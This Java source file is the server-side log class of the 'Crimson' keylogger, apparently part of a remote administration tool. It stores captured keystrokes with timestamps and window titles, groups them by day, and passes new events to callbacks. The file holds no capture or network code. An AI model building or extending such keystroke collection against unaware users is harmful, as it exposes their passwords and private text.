package com.subterranean_security.crimson.sv.keylogger;

import java.io.Serializable;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
import com.subterranean_security.crimson.core.storage.MemMap;

public class Log implements Serializable {

	private static final long serialVersionUID = 1L;

	public MemMap<Date, Page> pages = new MemMap<Date, Page>();

	public Date timestamp;

	public ArrayList<EV_KEvent> getEventsAfter(Date target) {
		ArrayList<EV_KEvent> ev = new ArrayList<EV_KEvent>();

		for (Date d : pages.keyset()) {
			// skip old dates
			if (d.getTime() + 100000 < target.getTime()) {
				continue;
			}
			try {
				for (Event e : pages.get(d).events) {
					Date dd = new Date(d.getTime() + e.timeOffset);
					if (dd.after(target)) {
						ev.add(EV_KEvent.newBuilder().setDate(dd.getTime())
								.setTitle(pages.get(d).titles.get(e.titleOffset)).setEvent(e.event).build());
					}
				}
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

		}

		return ev;

	}

	public void addEvent(EV_KEvent evKevent) {
		timestamp = new Date(evKevent.getDate());

		boolean flag = false;
		SimpleDateFormat formatter = new SimpleDateFormat("MM dd yyyy");
		for (Date d : pages.keyset()) {
			// TODO create utility for same day comparison
			if (formatter.format(d).equals(formatter.format(new Date(evKevent.getDate())))) {
				flag = true;
				try {
					pages.get(d).addEvent(evKevent);
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}

		if (!flag) {
			Page p = new Page(evKevent);
			pages.put(p.ref, p);
		}

		for (LogCallback lc : callbacks) {
			lc.launch(evKevent);
		}

	}

	private transient ArrayList<LogCallback> callbacks = new ArrayList<LogCallback>();

	public void addCallback(LogCallback r) {
		callbacks.add(r);
	}

}
